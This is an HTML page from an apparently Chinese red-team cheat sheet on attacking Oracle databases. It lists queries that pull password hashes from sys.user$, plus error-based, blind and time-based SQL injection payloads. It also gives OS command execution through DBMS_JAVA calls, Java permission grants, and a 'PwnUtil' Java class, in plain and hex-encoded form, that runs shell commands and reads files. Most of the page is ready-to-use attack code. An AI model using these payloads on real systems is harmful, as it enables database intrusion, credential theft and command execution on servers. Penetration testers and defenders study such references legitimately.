<!DOCTYPE html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!--
    The page_title contains the title for a page as shown in the navigation.
    Site name contains the name as defined in the mkdocs.yml
  -->
  <title>oracle - 红队命令速查</title>

  <!-- Page description -->
  

  <!-- Redirect -->
  

  <!-- Page author -->
  
  <!--
    Just add a favicon.ico image to the docs.
  -->
  <link rel="shortcut icon" href="../../img/favicon.ico">

  <link rel="stylesheet" href="../../css/colors.css">
  <link rel="stylesheet" href="../../css/bundle.css">
  <link rel="stylesheet" href="../../css/theme.css">
  <link media="print" onload="this.media='all'" rel="stylesheet" href="../../css/atom-dark-one.min.css">
  <!--
    extra_ess contains paths to CSS files in the users
    documentation directory or a list of CSS files defined in
    their mkdocs.yml.

    http://www.mkdocs.org/user-guide/configuration/#extra_css
  -->
  

  
  

  <!--
    Include Google Analytics tracking code.

    http://www.mkdocs.org/user-guide/configuration/#google_analytics
  -->
  

</head>

<body>
<input id="dark-mode" type="checkbox" />
<!--
  The JS has to be loaded here for maximum performance, right after the #dark-mode
-->
<script src="../../js/theme.js"></script>
<div class="app-body">
  <!-- KPN STYLE Beginning -->
  <div class="app-layout ">
    <!-- Top Bar -->
    <nav class="app-layout__top-bar top-bar">
      <a class="top-bar__logo" href="https://forum.ywhack.com/command/">
        <img alt="KPN Logo" src="../../img/logo.svg" />
      </a>
      <div class="top-bar__title">红队命令速查</div>
      <ul class="top-bar__menu">
        <!--
          Create a search form that sends the user to the search.html file - this is
          the other file in the template which adds search to the theme. The only
          requirement here is that there is a text input with the name 'q' and the
          action and methods match below.
        -->
          <li class="top-bar__item">

            <span role="search" id="search-input-wrapper">
              <form action="../../search.html" method="get">
                <input type="text" class="input" id="search-input" name="q" placeholder="Search..." />
              </form>
            </span >
          </li>
        <!--
          Versioning support
        -->
        
        <!--
          Support repo URL
        -->
        <li class="top-bar__item">
          
        </li>

        <li class="top-bar__item">
            <label class="top-bar__link" id="label-dark-mode" for="dark-mode" title="Dark mode">
              <svg alt="dark mode" width="24" height="24">
                <image xlink:href="../../img/ui-bulb.svg" width="24" height="24"/>
            </svg>
            </label>
        </li>
        <li class="top-bar__item top-bar__item--trigger"></li>

        <!-- <li class="top-bar__item">

          <a class="top-bar__link top-bar__link--active">Home</a>
        </li>
        <li class="top-bar__item"><a class="top-bar__link">Information</a></li>
        <li class="top-bar__item">
          <a class="top-bar__link top-bar__link--collapsed">Getting Started</a>

        </li>
        <li class="top-bar__item top-bar__item--trigger">Menu</li> -->
      </ul>
    </nav>

    <!--
      Create the navigation for the documentation.

      Because we don't know how many levels deep the navigation is, it needs to
      be included in it's own file so it can be recursive. Otherwise the theme
      can also only support a specific number of levels.

      See the nav.html file for more details about how this works.
    -->
    <nav class="app-layout__side-bar side-bar">
      <div class="side-bar__action-bar">
        <a class="side-bar__link" href="/">红队命令速查</a>
        <!--
          Versioning support
        -->
        
        <button class="side-bar__close"></button>
      </div>
      <ul class="side-bar__menu">
        
          <!--

-->

<li>
  <a href="../.." class="side-bar__link ">
    介绍
  </a>
</li>


        
          <!--

-->

<li>
  <a href="../../Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/" class="side-bar__link ">
    Linux 命令速查
  </a>
</li>


        
          <!--

-->

<li>
  <a href="../../Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/" class="side-bar__link ">
    Windows 命令速查
  </a>
</li>


        
          <!--

-->

  <li>
    <span class="side-bar__link side-bar__link--expanded">
      工具使用命令速查
    </span>
    <ul class="side-bar__sub-menu side-bar__sub-menu--visible">
        
            <!--

-->

<li>
  <a href="../../%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/" class="side-bar__link ">
    mimikatz
  </a>
</li>


        
    </ul>
  </li>


        
          <!--

-->

  <li>
    <span class="side-bar__link side-bar__link--expanded side-bar__link--active">
      数据库命令速查
    </span>
    <ul class="side-bar__sub-menu side-bar__sub-menu--visible">
        
            <!--

-->

<li>
  <a href="./" class="side-bar__link side-bar__link--active">
    oracle
  </a>
</li>


        
            <!--

-->

<li>
  <a href="../mysql/" class="side-bar__link ">
    mysql
  </a>
</li>


        
            <!--

-->

<li>
  <a href="../postgresql/" class="side-bar__link ">
    postgresql
  </a>
</li>


        
    </ul>
  </li>


        
      </ul>
    </nav>

    <!-- MAIN BLOCK -->
    <main class="app-layout__main main">
      <div class="app-layout__title-bar title-bar">
        <div class="title-bar__title" style="font-size: 12px;">oracle</div>
      </div>
      
      <div class="sidebar--secondary hidden-s hidden-xs">
        <h4>Table of contents</h4>
        <ul>
        
          
            
                <li><a class="a" href="#oracle_1">oracle查最大数量表</a></li>
                
            
                <li><a class="a" href="#user">查询包含 user 字段在哪个库哪个表</a></li>
                
            
                <li><a class="a" href="#oracle-sql">Oracle SQL 默认数据库</a></li>
                
            
                <li><a class="a" href="#oracle-sql_1">Oracle SQL 注释</a></li>
                
            
                <li><a class="a" href="#oracle-sql_2">Oracle SQL 版本</a></li>
                
            
                <li><a class="a" href="#oracle-sql_3">Oracle SQL 主机名</a></li>
                
            
                <li><a class="a" href="#oracle-sql_4">Oracle SQL 数据库名称</a></li>
                
            
                <li><a class="a" href="#oracle-sql_5">Oracle SQL 数据库凭证</a></li>
                
            
                <li><a class="a" href="#oracle-sql_6">Oracle SQL 列出数据库</a></li>
                
            
                <li><a class="a" href="#oracle-sql_7">Oracle SQL 列出列</a></li>
                
            
                <li><a class="a" href="#oracle-sql_8">Oracle SQL 列出表</a></li>
                
            
                <li><a class="a" href="#oracle-sql_9">Oracle SQL 报错注入</a></li>
                
            
                <li><a class="a" href="#oracle-sql_10">Oracle SQL 盲注</a></li>
                
            
                <li><a class="a" href="#oracle-sql_11">Oracle SQL 时间注入</a></li>
                
            
                <li><a class="a" href="#oracle-sql_12">Oracle SQL 命令执行</a></li>
                
                    <li class="child-li"><a class="a child" href="#oracle-java-execution">Oracle Java Execution</a></li>
                
                    <li class="child-li"><a class="a child" href="#oracle-java-class">Oracle Java Class</a></li>
                
            
                <li><a class="a" href="#references">References</a></li>
                
            
          
        
        </ul>
      </div>
      
      <div class="container content-block">
        <div class="kpn-style">
          <div class="card">
            <div class="card__body">

              
              <h1 id="oracle">oracle</h1>
<h2 id="oracle_1">oracle查最大数量表</h2>
<pre><code class="language-sql">select t.table_name,t.tablespace_name,t.owner,t.num_rows from  all_tables t  ORDER BY NUM_ROWS DESC;

select t.table_name,t.tablespace_name,t.owner,t.num_rows from  all_tables t  ORDER BY NUM_ROWS DESC;
select t.table_name tableName, f.comments comments
  from user_tables t
 inner join user_tab_comments f
    on t.table_name = f.table_name
</code></pre>
<h2 id="user">查询包含 user 字段在哪个库哪个表</h2>
<pre><code class="language-sql">SELECT 
    owner AS database_name,
    table_name,
    column_name
FROM 
    all_tab_columns
WHERE 
    column_name LIKE '%USER%'
ORDER BY 
    owner, table_name, column_name;
</code></pre>
<h2 id="oracle-sql">Oracle SQL 默认数据库</h2>
<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>SYSTEM</td>
<td>适用于所有版本</td>
</tr>
<tr>
<td>SYSAUX</td>
<td>适用于所有版本</td>
</tr>
</tbody>
</table>
<h2 id="oracle-sql_1">Oracle SQL 注释</h2>
<table>
<thead>
<tr>
<th>Type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-- -</code></td>
<td>SQL comment</td>
</tr>
</tbody>
</table>
<h2 id="oracle-sql_2">Oracle SQL 版本</h2>
<pre><code class="language-sql">SELECT user FROM dual UNION SELECT * FROM v$version
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
SELECT version FROM v$instance;
</code></pre>
<h2 id="oracle-sql_3">Oracle SQL 主机名</h2>
<pre><code class="language-sql">SELECT host_name FROM v$instance; (Privileged)
SELECT UTL_INADDR.get_host_name FROM dual;
SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;
SELECT UTL_INADDR.get_host_address FROM dual;
</code></pre>
<h2 id="oracle-sql_4">Oracle SQL 数据库名称</h2>
<pre><code class="language-sql">SELECT global_name FROM global_name;
SELECT name FROM V$DATABASE;
SELECT instance_name FROM V$INSTANCE;
SELECT SYS.DATABASE_NAME FROM DUAL;
</code></pre>
<h2 id="oracle-sql_5">Oracle SQL 数据库凭证</h2>
<table>
<thead>
<tr>
<th>SQL 语句</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SELECT username FROM all_users;</code></td>
<td>适用于所有版本</td>
</tr>
<tr>
<td><code>SELECT name, password from sys.user$;</code></td>
<td>Privileged, &lt;= 10g</td>
</tr>
<tr>
<td><code>SELECT name, spare4 from sys.user$;</code></td>
<td>Privileged, &lt;= 11g</td>
</tr>
</tbody>
</table>
<h2 id="oracle-sql_6">Oracle SQL 列出数据库</h2>
<pre><code class="language-sql">SELECT DISTINCT owner FROM all_tables;
</code></pre>
<h2 id="oracle-sql_7">Oracle SQL 列出列</h2>
<pre><code class="language-sql">SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';
</code></pre>
<h2 id="oracle-sql_8">Oracle SQL 列出表</h2>
<pre><code class="language-sql">SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
</code></pre>
<h2 id="oracle-sql_9">Oracle SQL 报错注入</h2>
<table>
<thead>
<tr>
<th style="text-align: left;">Description</th>
<th style="text-align: left;">Query</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;">Invalid HTTP Request</td>
<td style="text-align: left;"><code>SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual</code></td>
</tr>
<tr>
<td style="text-align: left;">CTXSYS.DRITHSX.SN</td>
<td style="text-align: left;"><code>SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual</code></td>
</tr>
<tr>
<td style="text-align: left;">Invalid XPath</td>
<td style="text-align: left;"><code>SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual</code></td>
</tr>
<tr>
<td style="text-align: left;">Invalid XML</td>
<td style="text-align: left;"><code>SELECT to_char(dbms_xmlgen.getxml('select "'&amp;#124;&amp;#124;(select user from sys.dual)&amp;#124;&amp;#124;'" FROM sys.dual')) FROM dual</code></td>
</tr>
<tr>
<td style="text-align: left;">Invalid XML</td>
<td style="text-align: left;"><code>SELECT rtrim(extract(xmlagg(xmlelement("s", username &amp;#124;&amp;#124; ',')),'/s').getstringval(),',') FROM all_users</code></td>
</tr>
<tr>
<td style="text-align: left;">SQL Error</td>
<td style="text-align: left;"><code>SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))</code></td>
</tr>
<tr>
<td style="text-align: left;">XDBURITYPE getblob</td>
<td style="text-align: left;"><code>XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()</code></td>
</tr>
<tr>
<td style="text-align: left;">XDBURITYPE getclob</td>
<td style="text-align: left;"><code>XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()</code></td>
</tr>
</tbody>
</table>
<p>When the injection point is inside a string use : <code>'||PAYLOAD--</code></p>
<h2 id="oracle-sql_10">Oracle SQL 盲注</h2>
<table>
<thead>
<tr>
<th style="text-align: left;">Description</th>
<th style="text-align: left;">Query</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;">Version is 12.2</td>
<td style="text-align: left;"><code>SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';</code></td>
</tr>
<tr>
<td style="text-align: left;">Subselect is enabled</td>
<td style="text-align: left;"><code>SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)</code></td>
</tr>
<tr>
<td style="text-align: left;">Table log_table exists</td>
<td style="text-align: left;"><code>SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);</code></td>
</tr>
<tr>
<td style="text-align: left;">Column message exists in table log_table</td>
<td style="text-align: left;"><code>SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';</code></td>
</tr>
<tr>
<td style="text-align: left;">First letter of first message is t</td>
<td style="text-align: left;"><code>SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';</code></td>
</tr>
</tbody>
</table>
<h2 id="oracle-sql_11">Oracle SQL 时间注入</h2>
<pre><code class="language-sql">AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 
</code></pre>
<h2 id="oracle-sql_12">Oracle SQL 命令执行</h2>
<ul>
<li><a href="https://github.com/quentinhardy/odat">ODAT (Oracle Database Attacking Tool)</a></li>
</ul>
<h3 id="oracle-java-execution">Oracle Java Execution</h3>
<ul>
<li>List Java privileges
    <code>sql
    select * from dba_java_policy
    select * from user_java_policy</code></li>
<li>Grant privileges
    <code>sql
    exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','&lt;&lt;ALL FILES&gt;&gt;','execute');
    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');</code></li>
<li>Execute commands<ul>
<li>10g R2, 11g R1 and R2: <code>DBMS_JAVA_TEST.FUNCALL()</code>
<code>sql
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir &gt;c:\test.txt') FROM DUAL
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls&gt;/tmp/OUT2.LST') from dual</code></li>
<li>11g R1 and R2: <code>DBMS_JAVA.RUNJAVA()</code>
<code>sql
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls&gt;/tmp/OUT.LST') FROM DUAL</code></li>
</ul>
</li>
</ul>
<h3 id="oracle-java-class">Oracle Java Class</h3>
<pre><code class="language-sql">/* create Java class */
BEGIN
EXECUTE IMMEDIATE 'create or replace and compile java source named &quot;PwnUtil&quot; as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = &quot;&quot;;while ((stemp = myReader.readLine()) != null) str += stemp + &quot;\n&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = &quot;&quot;;while((stemp = myReader.readLine()) != null) str += stemp + &quot;\n&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}}};';
END;
/

BEGIN
EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';
END;
/

/* run OS command */
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
</code></pre>
<p>or (hex encoded)</p>
<pre><code class="language-sql">/* create Java class */
SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));
EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual

/* run OS command */
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
</code></pre>
<h2 id="references">References</h2>
<ul>
<li><a href="https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle">NetSpi - SQL Wiki</a></li>
<li><a href="https://owasp.org/www-pdf-archive/ASDC12-New_and_Improved_Hacking_Oracle_From_Web.pdf">ASDC12 - New and Improved Hacking Oracle From Web - OWASP</a></li>
<li><a href="https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener">Pentesting Oracle TNS Listener - HackTricks</a></li>
<li><a href="https://github.com/quentinhardy/odat/wiki/privesc">ODAT: Oracle Database Attacking Tool - quentinhardy</a></li>
<li><a href="https://www.websec.ca/kb/sql_injection#Oracle_Default_Databases">WebSec CheatSheet - Oracle</a></li>
<li><a href="https://www.mannulinux.org/2023/12/New-payload-to-exploit-Error-based-SQL-injection-Oracle-database.html">New payload to exploit Error-based SQL injection - Oracle database - Mannu Linux - 12/09/2023</a></li>
<li>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md</li>
</ul>
              
            </div>
          </div>
        </div>
      </div>
    </main>

    <!-- FOOTER -->
    <footer class="footer">
      <div class="footer__body">
        
        <div class="row">
          <div class="col col--s-4 col--m-3 col--l-2">
          </div>
          <div class="col col--s-4 col--m space-between">
            
              <a class="footer__link padding-top-0 navigation-prev"
                href="../../%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/"
                title="mimikatz">
                &#8592; Previous Page
              </a>
            
            
            
              <a class="footer__link padding-top-0 navigation-next"
                href="../mysql/"
                title="mysql"/>
                Next Page &#8594;
              </a>
            
          </div>
          <div class="col col--s-4 col--m-3 ">
          </div>
        </div>
        
      </div>
    </footer>
  </div>


  <!--
  MkDocs version      : 1.5.3
  Docs Build Date UTC : 2024-07-09 15:06:35.703781+00:00
  -->

  <!--
    To include static assets from our theme, just add
    ../.. beforehand which will be the relative path to
    the root of the documentation.
  -->
  <script src="../../js/highlight.min.js"></script>
  <script src="../../js/languages/groovy.min.js"></script>
  <script src="../../js/languages/asciidoc.min.js"></script>
  <script src="../../js/languages/nix.min.js"></script>

  <script>
    hljs.highlightAll();
  </script>
  <script async src="../../js/detail.js"></script>
  <!--
    extra_javascript contains paths to JavaScript files in the
    users documentation directory or a list of JavaScript files
    defined in their mkdocs.yml.

    http://www.mkdocs.org/user-guide/configuration/#extra_javascript
  -->
  
    <script src="../../search/main.js"></script>
  


  <script>
  function getMermaidTheme() {
    if (document.getElementById("dark-mode").checked) {
      return 'dark'
    }
    return 'forest'
  }

  function initMermaid() {
    mermaid.initialize({
      theme: getMermaidTheme(),
      logLevel: 1,
    });
  }
  var mermaidClass = document.getElementsByClassName('mermaid');
  if (mermaidClass.length > 0) {

    var mermaidScript = document.createElement('script');
    mermaidScript.setAttribute("src", "../../js/mermaid.min.js");
    mermaidScript.setAttribute("async", "false");
    mermaidScript.setAttribute("type", "text/javascript");
    mermaidScript.onload = initMermaid;
    document.body.appendChild(mermaidScript)

  }
  </script>

</div>
</body>
</html>